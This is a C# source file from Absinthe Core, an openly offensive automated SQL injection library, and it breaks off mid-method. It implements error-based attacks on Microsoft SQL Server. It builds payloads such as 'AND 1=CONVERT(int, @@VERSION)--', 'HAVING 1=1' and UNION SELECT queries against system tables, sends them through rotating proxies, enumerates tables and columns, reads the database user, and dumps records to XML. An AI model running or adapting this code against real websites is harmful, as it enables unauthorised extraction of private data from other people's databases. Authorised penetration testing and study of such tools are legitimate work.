//   Absinthe Core - The Automated SQL Injection Library
//   This software is Copyright (C) 2004,2005  nummish, 0x90.org
//   $Id: SqlErrorAttackVector.cs,v 1.25 2006/07/15 01:48:57 nummish Exp $
//
//   This program is free software; you can redistribute it and/or modify
//   it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//   (at your option) any later version.
//
//   This program is distributed in the hope that it will be useful,
//   but WITHOUT ANY WARRANTY; without even the implied warranty of
//   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//   GNU General Public License for more details.
//
//   You should have received a copy of the GNU General Public License
//   along with this program; if not, write to the Free Software
//   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

using System;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Xml;
using System.Data;

namespace Absinthe.Core
{
	/// <summary>
	///  The SqlErrorAttackVector class is the object used to perform attacks utilizing Error Based SQL Injection
	/// </summary>
	public class SqlErrorAttackVector : AttackVector
	{
		private void BubbleUserStatus(string UserStatusMessage)
		{
			if (UserStatus != null)
				UserStatus(UserStatusMessage);
		}


		private bool _ConnectViaPost;
		private string _TargetURL;
		private string _VectorName;
		private string _VectorBuffer;
		private IErrorPlugin _Plugin;
		private NameValueCollection _AttackParams;
		private List<GlobalDS.Field> _QueryStructure;
		private ErrorInjectionOptions _Options;
		private Queue _Proxies;

		/// <summary>Event triggered when a table's data has been changed</summary>
		public event TableChangedEventHandler TableChanged;
		/// <summary>Event triggered when a status message is to be sent to the user</summary>
		public event UserEvents.UserStatusEventHandler UserStatus;
 
		/// <summary>Generates a new SqlErrorAttackVector</summary>
		/// <param name="URL">The target URL for the injection.</param>
		/// <param name="VectorName">The name of the parameter to be injected against.</param>
		/// <param name="VectorBuffer">The default value of the parameter to be injected against.</param>
		/// <param name="AdditionalParams">Any additional parameters for the request unreleated to the actual injection.</param>
		/// <param name="Method">The HTTP connection method. This may be "GET" or "POST".</param>
		/// <param name="PluginUsed">The plugin to use in this injection.</param>
		/// <param name="Options">Any options for this injection.</param>
		public SqlErrorAttackVector(string URL, string VectorName, string VectorBuffer, NameValueCollection AdditionalParams, string Method, IErrorPlugin PluginUsed,
				ErrorInjectionOptions Options)
		{			
			_TargetURL = URL;
			_Options = Options;
			_Plugin = PluginUsed;
			_Proxies = Options.WebProxies;
			_ConnectViaPost = String.Equals(Method.ToUpper(), "POST");	
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			_AttackParams = AdditionalParams;	
		
			ParsePage.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);
		}

		/// <summary>Generates a new SqlErrorAttackVector. This constructor is generally called when loading from a saved file.</summary>
		/// <param name="URL">The target URL for the injection.</param>
		/// <param name="Method">The HTTP connection method. This may be "GET" or "POST".</param>
		/// <param name="ElementList">The elements of the query being injected against.</param>
		/// <param name="VectorName">The name of the parameter to be injected against.</param>
		/// <param name="VectorBuffer">The default value of the parameter to be injected against.</param>
		/// <param name="AttackParams">Any additional parameters for the request unreleated to the actual injection.</param>
        /// <param name="PluginUsed">The plugin being used for this injection.</param>
		public SqlErrorAttackVector(string URL, string Method, List<GlobalDS.Field> ElementList, string VectorName, string VectorBuffer, NameValueCollection AttackParams, IErrorPlugin PluginUsed)
		{
			_TargetURL = URL;
			_ConnectViaPost = Method.ToUpper().Equals("POST"); 
			_QueryStructure = ElementList;
			_VectorName = VectorName;
			_Plugin = PluginUsed;
			_VectorBuffer = VectorBuffer;
			_AttackParams = AttackParams;

			ParsePage.UserStatus += new UserEvents.UserStatusEventHandler(BubbleUserStatus);
		}
		 
        /// <summary>
        /// Initializes the Attack Vector
        /// </summary>
		public void Initialize()//string VectorName, string VectorBuffer, NameValueCollection AdditionalParams)
		{
			System.Console.WriteLine("Verify versions: {0}", _Options.VerifyVersion.ToString());
	
			System.Console.WriteLine("Verifying version");
			if (_Options.VerifyVersion)
				VerifyServerVersion();
			

			UserStatus("Enumerating Attack Vector");
			EnumerateAttackVector();

			UserStatus("Typecasting Attack Vector");
			TypeCastAttackVector();

			UserStatus("Refining Attack Vector Typecasts");
			RefinedTypeCasting();
		}

        /// <summary>
        /// Automatically uses the available plugins to find a possible match.
        /// </summary>
        /// <param name="PossiblePlugins">The collection of possible error plugins</param>
        /// <param name="avf">The attack vector factory that will be used to generate the tests</param>
        /// <param name="Wp">The web proxy to use for the tests</param>
        /// <returns></returns>
		public static IErrorPlugin[] AutoDetectPlugins(IErrorPlugin[] PossiblePlugins, AttackVectorFactory avf,			 
			 WebProxy Wp)
		{
			StringBuilder CurrentVector = new StringBuilder();

			CurrentVector.Append(avf.VectorBuffer);
			
			if (avf.Options.InjectAsString)
				CurrentVector.Append("'");
			
			CurrentVector.Append(" AND 1=CONVERT(int, @@VERSION)");

			if (avf.Options.TerminateQuery) 
				CurrentVector.Append("--");
			else if (avf.Options.InjectAsString)
				CurrentVector.Append(" AND '1'='1");
			
			avf.AttackParams[avf.VectorName] = CurrentVector.ToString();

			string ResultPage;
			ResultPage = httpConnect.PageRequest(avf.TargetUrl, avf.AttackParams, Wp, avf.isPost, avf.Options.Cookies, avf.Options.AuthCredentials, avf.Options.UserAgent);

			bool FoundVersion = false;
			List<IErrorPlugin> FoundValues = new List<IErrorPlugin>();

			foreach (IErrorPlugin Plugin in PossiblePlugins)
			{
				foreach (string VersionString in Plugin.KnownSupportedVersions)
				{
					if(ResultPage.IndexOf(VersionString) >= 0)
					{
						FoundVersion = true;
						FoundValues.Add(Plugin);
						break;
					}
				}
			}

			if (!FoundVersion)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(avf.VectorBuffer);

				if (avf.Options.InjectAsString)
					CurrentVector.Append("'");
					
				CurrentVector.Append(" HAVING ");
				if (avf.Options.InjectAsString && !avf.Options.TerminateQuery)
					CurrentVector.Append("'1'='1");
				else
					CurrentVector.Append("1=1");

				if (avf.Options.TerminateQuery)
					CurrentVector.Append("--");
					
				avf.AttackParams[avf.VectorName] = CurrentVector.ToString();

				string HavingResultPage;
				HavingResultPage = httpConnect.PageRequest(avf.TargetUrl, avf.AttackParams, Wp, avf.isPost, avf.Options.Cookies, avf.Options.AuthCredentials, avf.Options.UserAgent);
                					
				throw new UnsupportedSQLErrorVersionException(ResultPage, HavingResultPage);
			}

			return FoundValues.ToArray();
		}
	 
		private void VerifyServerVersion()
		{
			StringBuilder CurrentVector = new StringBuilder();

			CurrentVector.Append(_VectorBuffer);
			
			if (_Options.InjectAsString)
				CurrentVector.Append("'");
			
			CurrentVector.Append(" AND 1=CONVERT(int, @@VERSION)");

			if (_Options.TerminateQuery) 
				CurrentVector.Append("--");
			else if (_Options.InjectAsString)
				CurrentVector.Append(" AND '1'='1");
			
			_AttackParams[_VectorName] = CurrentVector.ToString();

			string ResultPage;
			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

			bool FoundVersion = false;
			foreach (string VersionString in _Plugin.KnownSupportedVersions)
			{
                System.Text.RegularExpressions.Regex VersionRegex = new System.Text.RegularExpressions.Regex(VersionString);
				if(VersionRegex.Match(ResultPage).Success)
				{
					FoundVersion = true;
					break;
				}
			}

			if (!FoundVersion)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);

				if (_Options.InjectAsString)
					CurrentVector.Append("'");
					
				CurrentVector.Append(" HAVING ");
				if (_Options.InjectAsString && !_Options.TerminateQuery)
					CurrentVector.Append("'1'='1");
				else
					CurrentVector.Append("1=1");

				if (_Options.TerminateQuery)
					CurrentVector.Append("--");
					
				_AttackParams[_VectorName] = CurrentVector.ToString();

				string HavingResultPage;
				HavingResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
                					
				throw new UnsupportedSQLErrorVersionException(ResultPage, HavingResultPage);
			}
		}
	 
		/// <summary>Extract proxy and reinsert it</summary>
		/// <returns>The rotated proxy to use</returns>
		private WebProxy RotatedProxy()
		{
			WebProxy retVal = null;
			
			if (_Proxies != null)
			{ 
				retVal = (WebProxy) _Proxies.Dequeue(); 
				_Proxies.Enqueue(retVal); 
			}

			return retVal;
		}
		 
		private void TypeCastAttackVector()
		{
			StringBuilder CurrentVector = new StringBuilder();

			for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
			{
				UserStatus(String.Format("Counter is at {0} of {1}", FieldCounter, _QueryStructure.Count));

				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer).Append(" UNION SELECT SUM(");
				CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).FullName);
				CurrentVector.Append(") FROM ");
				CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).TableName);
				CurrentVector.Append("--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;
				UserStatus(String.Format("hmm: {0}", CurrentVector.ToString()));
				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

				GlobalDS.Field dbg = (GlobalDS.Field) _QueryStructure[FieldCounter];
				dbg.DataType = ParsePage.ParseUnionSumError(ResultPage, _Plugin);

				// ## DEBUG
				UserStatus(String.Format("Resulting Data: {0} - {1}", dbg.FullName, dbg.DataType));
				_QueryStructure[FieldCounter] = dbg;
			}

			UserStatus("Finished Typecasting..");

		}
		 
		private List<int> FindAllInts(List<GlobalDS.Field> QueryStructure)
		{
			List<int> retVal = new List<int>();

			for (int Counter = 0; Counter < QueryStructure.Count; Counter++)
			{
				if (((GlobalDS.Field)_QueryStructure[Counter]).DataType == System.Data.SqlDbType.Int)
				{
					retVal.Add(Counter);
				}
			}

			return retVal;
		}
	  
		private List<int> FindAllVariInts(List<GlobalDS.Field> QueryStructure)
		{
			List<int> retVal = new List<int>();

			for (int Counter = 0; Counter < QueryStructure.Count; Counter++)
			{
				if (((GlobalDS.Field)_QueryStructure[Counter]).DataType == System.Data.SqlDbType.Int
					|| ((GlobalDS.Field)_QueryStructure[Counter]).DataType == System.Data.SqlDbType.Variant)
				{
					retVal.Add(Counter);
				}
			}

			return retVal;
		}

		private void RefinedTypeCasting()
		{
			StringBuilder CurrentVector = new StringBuilder();

			List<int> IntList = FindAllVariInts(_QueryStructure);

			for (int IntCounter = 0; IntCounter < IntList.Count; IntCounter++)
			{
				UserStatus("Refining Integer #" + IntCounter);

				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer).Append(" UNION ALL SELECT ");


				for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
				{
					if (FieldCounter == (int) IntList[IntCounter] || ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.VarChar
						|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Char 
						|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.NVarChar)
					{
						//CurrentVector.Append("@@version,");
						CurrentVector.Append("char(0x61),");
					}// Text and NText are a pain in the ASS
					else if (((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Text
						|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.NText
						|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Variant)
					{
						CurrentVector.Append("NULL,");
					}

					else
					{
						UserStatus(String.Format("Refining {0}", ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType));
						CurrentVector.Append("1,");
					}

				}
				CurrentVector.Remove(CurrentVector.Length - 1, 1);

				CurrentVector.Append(" ORDER BY 1--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;

				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

				GlobalDS.Field AdjustedField = (GlobalDS.Field) _QueryStructure[(int) IntList[IntCounter]];

				AdjustedField.DataType = ParsePage.ParseUnionSelectForIntegerRefinement(ResultPage, _Plugin);

				_QueryStructure[(int) IntList[IntCounter]] = AdjustedField;

			}

			UserStatus("Finished Refining Typecasts");

		}
	 
		private void EnumerateAttackVector()
		{
			StringBuilder CurrentVector;
			// Initiate "Having" enumeration
			GlobalDS.Field newField;

			_QueryStructure = new List<GlobalDS.Field>();

			do
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);

				// This is where the GROUP BY clause is added
				if (_QueryStructure.Count > 0)
				{
					CurrentVector.Append(" GROUP BY");

					for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
					{
						CurrentVector.Append(" ");
						CurrentVector.Append(((GlobalDS.Field)_QueryStructure[FieldCounter]).FullName);
						CurrentVector.Append(",");
					}

					CurrentVector.Remove(CurrentVector.Length - 1, 1);
				}

				CurrentVector.Append(" HAVING 1=1");

				if (_Options.TerminateQuery) CurrentVector.Append("--");

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPage;
				ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

				System.Console.WriteLine(ResultPage);

				newField = ParsePage.ParseGroupedHaving(ResultPage, _Plugin);

				if (newField.FieldName.Length > 0)
				{
					_QueryStructure.Add(newField);
					UserStatus(String.Format("QueryStructure Size After adding: {0}", _QueryStructure.Count));
				}
				else
				{
					UserStatus(ResultPage);
				}

			}while (newField.FieldName.Length > 0);

			System.Console.WriteLine("Done Enumeration, I think");

		}
		 
		/// <summary>
		/// Serializes the state variables to XML
		/// </summary>
		/// <param name="xOutput">The XmlTextWriter this data should be written into</param>
		public void ToXml(ref XmlTextWriter xOutput)
		{

			xOutput.WriteStartElement("attackvector");
			GlobalDS.Field[] av = _QueryStructure.ToArray();

			xOutput.WriteStartAttribute("name", null);
			xOutput.WriteString(_VectorName);
			xOutput.WriteEndAttribute();

			xOutput.WriteStartAttribute("buffer", null);
			xOutput.WriteString(_VectorBuffer);
			xOutput.WriteEndAttribute();

			xOutput.WriteStartAttribute("type", null);
			xOutput.WriteString(this.ExploitType.ToString());
			xOutput.WriteEndAttribute();

			for (int i = 0; i < av.Length; i++)
			{
				xOutput.WriteStartElement("entry");

				xOutput.WriteStartAttribute("field", null);
				xOutput.WriteString(av[i].FieldName);
				xOutput.WriteEndAttribute();
				System.Console.WriteLine(av[i].FieldName);

				xOutput.WriteStartAttribute("table", null);
				xOutput.WriteString(av[i].TableName);
				xOutput.WriteEndAttribute();

				xOutput.WriteStartAttribute("datatype", null);
				xOutput.WriteString(av[i].DataType.ToString());
				xOutput.WriteEndAttribute();

				xOutput.WriteStartAttribute("seq", null);
				xOutput.WriteString(i.ToString());
				xOutput.WriteEndAttribute();

				xOutput.WriteEndElement();
			}

			xOutput.WriteEndElement();
		}
	 
		/// <summary>
		/// The type of SQL Injection exploit
		/// </summary>
		public GlobalDS.ExploitType ExploitType
		{
			get
			{
				return GlobalDS.ExploitType.ErrorBasedTSQL;
			}
		}
		 
		/// <summary>
		/// Retrieves the table schema of an injected database
		/// </summary>
		/// <param name="TableData">The table data this should be stored into</param>
		public void PopulateTableStructure(ref GlobalDS.Table TableData)
		{			 
			int FieldCount;

			FieldCount = GetFieldCount(TableData.ObjectID);	
			
			for (int i=0; i < FieldCount; i++)
			{	
				TableData.AddField(GetFieldData(TableData.ObjectID, i));
			}
		}
	 
		private GlobalDS.Field GetFieldData(long TableID, int FieldID)
		{
			GlobalDS.Field retVal = new GlobalDS.Field();
			
			StringBuilder WhereClause = new StringBuilder();
			WhereClause.Append("id=").Append(TableID).Append(" and colid > ").Append(FieldID);

			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("name + char(58)+convert(char,xtype)", "syscolumns", WhereClause.ToString());
			

			string ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

			string PulledData = ParsePage.ParseUnionSelectForNvarchar(ResultPage, _Plugin);

			string[] values = PulledData.Split(':');

			retVal.FieldName = values[0];
			retVal.DataType = GetSqlDataType(Convert.ToInt64(values[1].Trim()));

			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("char(58) + convert(char, status)", "sysconstraints", "id=" + TableID + " and colid=" + FieldID);
			ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

			PulledData = ParsePage.ParseUnionSelectForVarchar(ResultPage, _Plugin);

			if (PulledData.Length > 0)
			{
				PulledData = PulledData.Substring(1, PulledData.Length -1);
				retVal.IsPrimary = ((Convert.ToInt32(PulledData.Trim()) & 1) == 1);
			}
			
			return retVal;
		}
		 
		/// <summary>
		/// Takes the numeric version of the data type and converts it to an internally recognizable format
		/// </summary>
		/// <param name="DataType">The data type as stored by the SQL server</param>
		/// <returns>The .NET recognizable data type</returns>
		public SqlDbType GetSqlDataType(long DataType)
		{
			switch (DataType)
			{
				case 56:
					return SqlDbType.Int;
				case 167:
					return SqlDbType.VarChar;
				case 175:
					return SqlDbType.Char;
				case 106: 
					return SqlDbType.Decimal;
				case 127:
					return SqlDbType.BigInt;
				case 173:
					return SqlDbType.Binary;
				case 104:
					return SqlDbType.Bit;
				case 61:
					return SqlDbType.DateTime;
				case 34:
					return SqlDbType.Image;
				case 60:
					return SqlDbType.Money;
				case 239:
					return SqlDbType.NChar;
				case 99:
					return SqlDbType.NText;
				case 108:
					// There's no Numeric type.. weird
					return SqlDbType.Variant;
				case 62:
					return SqlDbType.Float;
				case 231:
					return SqlDbType.NVarChar;
				case 59:
					return SqlDbType.Real;
				case 58:
					return SqlDbType.SmallDateTime;
				case 52:
					return SqlDbType.SmallInt;
				case 122:
					return SqlDbType.SmallMoney;
				case 35:
					return SqlDbType.Text;
				case 189:
					return SqlDbType.Timestamp;
				case 48:
					return SqlDbType.TinyInt;
				case 36:
					return SqlDbType.UniqueIdentifier;
				case 165:
					return SqlDbType.VarBinary;
				
			}

			return SqlDbType.Variant;
		}
	 
		/// <summary>
		/// The proxies being used by this sql injection
		/// </summary>
		public Queue Proxies
		{
			set
			{
				_Proxies = value;
			}
		}
	 
		/// <summary>
		/// Pull the username the database is running as
		/// </summary>
		/// <returns>The database username</returns>
		public string GetDatabaseUsername()
		{
			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("char(40) + SYSTEM_USER + char(41)", null, null);

			string ResultPage;
			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);

			string Username = ParsePage.ParseUnionSelectForNvarchar(ResultPage, _Plugin);
			return Username.Substring(1, Username.Length-2); // remove brackets
		}
		 
		private string GeneralPurposeUnionTextSelect(string Fieldname, string Tablename, string Where)
		{
			StringBuilder CurrentVector = new StringBuilder();

			List<int> IntList = FindAllInts(_QueryStructure);

			CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer).Append(" UNION ALL SELECT ");
			bool NoIntsYet = true;

			for (int FieldCounter = 0; FieldCounter < _QueryStructure.Count; FieldCounter++)
			{
				if (NoIntsYet && ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Int
					|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Float)
					
				{
					CurrentVector.Append("convert(int,").Append(Fieldname).Append("),");
					NoIntsYet = false;
				}
				else if (((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.VarChar
					|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Char 
					|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.NVarChar)
				{
					//CurrentVector.Append("@@version,");
					CurrentVector.Append("char(0x61),");
				}// Text and NText are a pain in the ASS
				else if (((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Text
					|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.NText
					|| ((GlobalDS.Field)_QueryStructure[FieldCounter]).DataType == System.Data.SqlDbType.Variant)
				{
					CurrentVector.Append("NULL,");
				}
				else
					CurrentVector.Append("1,");

			}
			CurrentVector.Remove(CurrentVector.Length - 1, 1);

			if (Tablename != null && Tablename.Length > 0)
				CurrentVector.Append(" FROM ").Append(Tablename);

			if (Where != null && Where.Length > 0)
				CurrentVector.Append(" WHERE ").Append(Where);

			CurrentVector.Append(" ORDER BY 1--");

			return CurrentVector.ToString();
		}

		/// <summary>Takes a partially built schema and continues to download what is left</summary>
		/// <param name="RecoveredList">The preexisting schema</param>
		/// <returns>The fully downloaded schema</returns>
		public GlobalDS.Table[] RecoverTableList(GlobalDS.Table[] RecoveredList)
		{ 
			long TableCount;
			List<GlobalDS.Table> retVal = new List<GlobalDS.Table>(RecoveredList);
 
			TableCount = GetTableCount();
			GlobalDS.Table NewTable;
			UserStatus(String.Format("Table Count: {0}", TableCount));
			long PreviousTableID;
				
			for (int i=RecoveredList.Length; i < TableCount; i++)
			{
				if (i == 0)
					PreviousTableID = 0;
				else
					PreviousTableID = ((GlobalDS.Table) retVal[i-1]).ObjectID;
				
				NewTable = RetrieveTable(PreviousTableID);
				retVal.Add(NewTable);
				TableChanged(NewTable);
			}

			return retVal.ToArray();
		}
		 
		/// <summary>Retrieves the list of tables from a database</summary>
		/// <returns>An array of tables</returns>
		public GlobalDS.Table[] GetTableList()
		{			 
			long TableCount;
			List<GlobalDS.Table> retVal = new List<GlobalDS.Table>();

			TableCount = GetTableCount();
			GlobalDS.Table NewTable;
			UserStatus(String.Format("Table Count: {0}", TableCount));
			long PreviousTableID;
				
			for (int i=0; i < TableCount; i++)
			{
				if (i == 0)
					PreviousTableID = 0;
				else
					PreviousTableID = ((GlobalDS.Table) retVal[i-1]).ObjectID;
				
				NewTable = RetrieveTable(PreviousTableID);
				retVal.Add(NewTable);
				TableChanged(NewTable);
			}

            return retVal.ToArray();
		}	
	 
		/// <summary>Downloads the contents of the given fields and tables from the database to an XML file.</summary>
		/// <param name="SrcTable">An array of the tables to pull data from</param>
		/// <param name="ColumnIDs">An array of the column lists to be pulled from the database.
		/// The indices from this array should match up with the indices of the SrcTable.</param>
		/// <param name="xmlFilename">The filename to write the downloaded XML data to.</param>
		public void PullDataFromTable(GlobalDS.Table[] SrcTable, long[][] ColumnIDs, string xmlFilename)
		{
			int TableCount;
			if (xmlFilename.Length == 0) throw new System.Exception(" No File Defined. ");

			XmlTextWriter xOutput = new XmlTextWriter(xmlFilename, System.Text.Encoding.UTF8);
			xOutput.Formatting = Formatting.Indented;
			xOutput.Indentation = 4;
			xOutput.WriteStartDocument();

			xOutput.WriteStartElement("AbsinthedatabasePull");
			xOutput.WriteStartAttribute("version", null);
			xOutput.WriteString("1.0");
			xOutput.WriteEndAttribute();

			try
			{
				for (TableCount = 0; TableCount < SrcTable.Length; TableCount++)
				{
					PullDataFromIndividualTable(SrcTable[TableCount], ColumnIDs[TableCount], ref xOutput);
				}
			}
			catch (Exception e)
			{
				UserStatus(e.ToString());
			}
			finally
			{
				xOutput.WriteEndElement();
				xOutput.WriteEndDocument();
				xOutput.Close();
			}
		}
		// }}}
		
		// {{{ PullDataFromIndividualTable
		private List<Hashtable> PullDataFromIndividualTable(GlobalDS.Table SrcTable, long[] ColumnIDs, ref XmlTextWriter xOutput)
		{
			List<Hashtable> retVal = new List<Hashtable>();
			long RecordCounter = 0;
			GlobalDS.Field[] ColumnList = new GlobalDS.Field[ColumnIDs.Length];
			GlobalDS.PrimaryKey CurrentPrimaryKey = new GlobalDS.PrimaryKey();
			int ColumnCounter = 0;
			string PrimaryKeyName = String.Empty;
			SqlDbType PrimaryKeyType= SqlDbType.Int;

			UserStatus(String.Format("Individual Pulling {0}", SrcTable.Name));

			// Generate Field List
			for (long FieldCounter = 0; FieldCounter < SrcTable.FieldList.Length; FieldCounter++)
			{
				UserStatus(String.Format("Going for Field: {0}", SrcTable.FieldList[FieldCounter].FieldName));

				if (Array.IndexOf(ColumnIDs, FieldCounter) >= 0)
				{
					ColumnList[ColumnCounter] = SrcTable.FieldList[FieldCounter];
					ColumnCounter++;
				}

				if (SrcTable.FieldList[FieldCounter].IsPrimary)
				{
					PrimaryKeyName = SrcTable.FieldList[FieldCounter].FieldName;
					PrimaryKeyType = SrcTable.FieldList[FieldCounter].DataType;
				}
			}

			if (PrimaryKeyName.Length > 0)
			{
				for (RecordCounter = 0; RecordCounter < SrcTable.RecordCount; RecordCounter++)
				{
					CurrentPrimaryKey = IteratePrimaryKey(SrcTable.Name, PrimaryKeyName, CurrentPrimaryKey, PrimaryKeyType);
					Hashtable Record = GetRecord(SrcTable.Name, ColumnList, CurrentPrimaryKey);
					retVal.Add(Record);
					OutputRecordToFile(ref xOutput, Record, CurrentPrimaryKey);
				}
			}

			return retVal;
		}
		// }}}

		// {{{ GetRecord
		private Hashtable GetRecord(string TableName, GlobalDS.Field[] Columns, GlobalDS.PrimaryKey pk)
		{
			int ColumnCounter;
			Hashtable retVal = new Hashtable();

			for (ColumnCounter = 0; ColumnCounter < Columns.Length; ColumnCounter++)
			{
				DictionaryEntry de = GetFieldData(TableName, Columns[ColumnCounter], pk);
				retVal.Add(de.Key, de.Value);
			}

			return retVal;
		}
		// }}}

		// {{{ GetFieldData
		private DictionaryEntry GetFieldData(string TableName, GlobalDS.Field Column, GlobalDS.PrimaryKey pk)
		{
			DictionaryEntry retVal = new DictionaryEntry();

			retVal.Key = Column.FieldName;
			retVal.Value = string.Empty;

			if (Column.FieldName.Equals(pk.Name))
			{
				retVal.Value = pk.Value;
				return retVal;
			}

			StringBuilder SelectClause = new StringBuilder();
			

			switch (Column.DataType)
			{
				case SqlDbType.BigInt: case SqlDbType.SmallInt: case SqlDbType.TinyInt:
				case SqlDbType.Int: case SqlDbType.Decimal: case SqlDbType.DateTime:
				case SqlDbType.Money: case SqlDbType.Float: case SqlDbType.Real:
				case SqlDbType.SmallDateTime: case SqlDbType.SmallMoney: case SqlDbType.Timestamp:
				case SqlDbType.UniqueIdentifier:
					//retVal.Value = OpenEndedIntegerSearch(Column.FieldName, TableName, pk);
					SelectClause.Append("char(58) + convert(nvarchar, ").Append(Column.FieldName).Append(") + char(58)");

					break;
				case SqlDbType.NChar: case SqlDbType.Char: case SqlDbType.NVarChar:
				case SqlDbType.Text: case SqlDbType.NText: case SqlDbType.VarChar:
					//retVal.Value = GetFieldDataVarChar(Column.FieldName, TableName, pk);
					SelectClause.Append("char(58) + convert(nvarchar, ").Append(Column.FieldName).Append(") + char(58)");
					break;
				case SqlDbType.Bit:
					//retVal.Value = GetBitField(Column.FieldName, TableName, pk);	
					SelectClause.Append("char(58) + convert(nvarchar, ").Append(Column.FieldName).Append(") + char(58)");
					break;
				case SqlDbType.Image: case SqlDbType.Binary: case SqlDbType.VarBinary:
					// TODO: Figure out how to support this!
					//retVal.Value = null;
					break;
			}

			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect(SelectClause.ToString(), TableName, pk.Name + " = " + pk.Value);
			

			string ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
			string ResultText = ParsePage.ParseUnionSelectForNvarchar(ResultPage, _Plugin);

			retVal.Value = ResultText.Substring(1, ResultText.Length - 2);

			return retVal;
		}
		// }}}

		// {{{ GetFieldCount
		private int GetFieldCount(long TableID)
		{
			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("char(58)+convert(char,count(name))", "syscolumns", "id=" + TableID);

			string ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials,  _Options.UserAgent);

			string PulledCount = ParsePage.ParseUnionSelectForVarchar(ResultPage, _Plugin);

			PulledCount = PulledCount.Substring(1,PulledCount.Length-2).Trim();

			return Convert.ToInt32(PulledCount);
		}
		 
		private long GetTableCount()
		{
			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("char(58)+convert(char,count(name))+char(58)", "sysobjects", "xtype=char(85)");

			string ResultPage =  httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
			string PulledCount = ParsePage.ParseUnionSelectForVarchar(ResultPage, _Plugin);

			PulledCount = PulledCount.Substring(1,PulledCount.Length-2).Trim();						

			return Convert.ToInt64(PulledCount);
		}
	 
		private GlobalDS.Table RetrieveTable(long PreviousTableID)
		{
			GlobalDS.Table retVal = new GlobalDS.Table();

			_AttackParams[_VectorName] = GeneralPurposeUnionTextSelect("convert(int, name + char(58) + convert(char, id))", "sysobjects", "xtype=char(85) and id > " + PreviousTableID.ToString());

			string ResultPage, ResultText;

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, RotatedProxy(), _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _Options.UserAgent);
			ResultText = ParsePage.ParseUnionSelectForNvarchar(ResultPage, _Plugin);

			string[] values = ResultText.Split(':');

			retVal.Name = values[0];
			retVal.ObjectID = Convert.ToInt64(values[1]);

